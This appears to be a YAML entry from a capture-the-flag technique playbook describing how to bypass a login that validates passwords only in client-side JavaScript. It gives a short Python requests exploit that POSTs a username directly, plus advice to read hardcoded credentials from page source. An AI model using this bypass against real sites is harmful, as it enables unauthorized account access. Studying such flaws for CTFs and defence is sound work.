name: login_bypass_client_side_validation
category: web
tags: [authentication_bypass, client_side_validation, business_logic, privilege_escalation]
indicators:
  - "JavaScript client-side password validation"
  - "Server only checks isset($_POST['username'])"
  - "No server-side password verification"
  - "Credentials visible in JavaScript source code"

tricks:
  - name: "Bypass client-side validation"
    when: "Login validation only in JavaScript, server only checks if POST parameter exists"
    how: "Directly POST username without going through JavaScript validation"
    payload: |
      # JavaScript validation:
      # if (document.form.password.value=='sup3rsecr3t' && document.form.username.value=='admin')

      # Server-side PHP:
      # if(isset($_POST['username'])) { echo $flag; }

      # Exploit - bypass JavaScript, directly POST:
      import requests
      requests.post(url, data={"username": "anything"})

  - name: "Extract credentials from JavaScript"
    when: "Credentials hardcoded in client-side JavaScript"
    how: "View page source to find credentials"
    payload: |
      # Credentials in JavaScript:
      # password.value=='sup3rsecr3t' && username.value=='admin'
